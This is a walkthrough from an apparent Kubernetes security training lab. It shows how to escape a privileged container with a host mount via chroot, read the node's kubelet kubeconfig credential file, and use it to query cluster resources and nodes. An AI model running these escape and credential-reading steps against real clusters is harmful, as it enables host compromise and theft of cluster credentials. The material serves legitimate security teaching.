# ‚éà Container escape to the host system

## üôå Overview

This scenario is to showcase the common misconfigurations and one of the error-prone security issues in Kubernetes, container environments, and the general security world. Giving privileges not required for things always makes it worst, especially in the containers and Kubernetes world it can take this step further and beyond the container to the other systems and services based on the configuration and setup of the cluster environments and resources. In this scenario we see a privileged container escape to gain access to the host system by escaping out of the container.

By the end of the scenario, we will understand and learn the following

1. Able to exploit container and escape out of the docker container
2. You will learn to test and exploit the misconfigured and privileged containers
3. Learn common misconfigurations and possible damage due to them for the containers, Kubernetes, and clusterized environments

### ‚ö°Ô∏è The story

Most of the monitoring, tracing, and debugging software requires running with extra privileges and capabilities. Here in this scenario, we will see a pod with extra capabilities and privileges including HostPath allowing us to gain access to the host system and provide Node level configuration to gain complete cluster compromise.

### üéØ Goal

The goal of this scenario is to escape out of the running docker container to the host system using the available misconfigurations. Then use the host system-level access to gain other resources access and if possible even go beyond this container, node, and cluster-level access.

:::tip

Gain access to the host system and obtain the node level kubeconfig file `/var/lib/kubelet/kubeconfig`, and query the Kubernetes nodes using the obtained configuration

## üéâ Solution & Walkthrough

### üé≤ Method 1

* After performing the analysis, we can identify that this container has complete privileges of the host system and allows privilege escalation. As well as `/host-system` is mounted from the host system

```bash
capsh --print
```

```bash
mount
```

* Now we can explore the mounted file system by navigating to the `/host-system` path

```bash
ls /host-system/
```

![Scenario 4 host system](images/sc-4-2.png)

* We can gain access to the host system privileges using `chroot`

```bash
chroot /host-system bash
```

* As you can see, now we can access all the host system resources like docker containers, configurations, etc.

```bash
docker ps
```

* The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If we can use this configuration, we gain the same privileges as the Kubernetes node

```bash
cat /var/lib/kubelet/kubeconfig
```

:::tip

We can use the available `kubectl` command-line utility to explore other resources using the obtained configuration. Also, we can leverage a ton of other possible things by using the available utilities or downloading them as required.

:::

* Using the kubelet configuration to list the Kubernetes cluster-wide resources

```bash
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system
```

![Scenario 4 get kube-system](images/sc-4-5.png)

:::info

From here we can go beyond by performing the lateral moment and post-exploitation based on the available setup, configuration, and resources
:::

* We can able to obtain the available nodes in the Kubernetes cluster by running the following command

```bash
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes
```

* Hooray ü•≥ , now we can see that it returns the cluster nodes available as we have the privilege/permissions with obtained configuration to query the Kubernetes API server
